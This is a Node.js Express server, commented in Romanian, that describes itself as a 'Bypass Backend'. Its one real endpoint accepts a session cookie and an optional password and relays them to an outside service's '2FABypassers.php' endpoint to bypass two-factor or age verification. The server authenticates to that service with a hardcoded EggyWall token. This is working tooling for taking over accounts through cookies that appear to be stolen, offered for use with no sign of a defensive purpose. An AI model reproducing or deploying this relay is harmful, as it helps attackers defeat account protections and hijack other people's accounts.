const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json());

// ===== EGGYWALL TOKEN (hardcodat) =====
const EGGYWALL_TOKEN = '54c3e3344ae12f0a7349b459a4c3ca2440731c6eb18d1a204ea0784457709f5a';

// ===== PING =====
app.get('/', (req, res) => {
    res.send('✅ Bypass Backend is live! Use /api/bypass for requests.');
});

app.get('/ping', (req, res) => {
    res.status(200).send('OK');
});

// ===== BYPASS =====
app.post('/api/bypass', async (req, res) => {
    console.log('📥 Request primit la /api/bypass');

    const { token, password, eggyToken } = req.body;

    if (!token) {
        console.log('❌ Token lipsă');
        return res.status(400).json({ error: 'Token lipsește' });
    }

    console.log(`📤 Token: ${token.substring(0, 30)}...`);
    console.log(`📤 Parolă: ${password ? '***' : 'gol'}`);
    console.log(`📤 EggyToken: ${eggyToken ? eggyToken.substring(0, 20) + '...' : 'nu'}`);

    // Folosește tokenul primit sau cel hardcodat
    const finalEggyToken = eggyToken || EGGYWALL_TOKEN;

    try {
        const payload = {
            Cookie: token,
            Type: 'AgeV2',
            Password: password || ''
        };

        console.log('📦 Payload trimis către immortal.st:', JSON.stringify(payload));

        const response = await fetch('https://immortal.st/pages//misc/2FABypassers.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7',
                'Referer': 'https://immortal.st/dashboard',
                'Origin': 'https://immortal.st',
                'X-EggyWall-Token': finalEggyToken,
                'EggyWall-Token': finalEggyToken
            },
            body: JSON.stringify(payload)
        });

        const data = await response.text();
        console.log('📥 Răspuns primit de la immortal.st (lungime):', data.length);

        // Încearcă să parseze JSON
        try {
            const jsonData = JSON.parse(data);
            console.log('📥 Status răspuns:', jsonData.status || 'necunoscut');
            if (jsonData.status === 'success') {
                console.log('✅ Bypass reușit!');
            } else {
                console.log('❌ Bypass eșuat:', jsonData.message || jsonData.error);
            }
            res.status(response.status).json(jsonData);
        } catch (e) {
            console.log('📥 Răspuns non-JSON:', data.substring(0, 100));
            res.status(response.status).send(data);
        }

    } catch (error) {
        console.error('❌ Eroare fetch:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// ===== STATUS =====
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        eggyToken: EGGYWALL_TOKEN ? 'setat' : 'lipsă',
        timestamp: new Date().toISOString()
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server rulând pe port ${PORT}`);
    console.log(`🧩 EggyWall Token: ${EGGYWALL_TOKEN ? 'setat' : 'lipsă'}`);
});
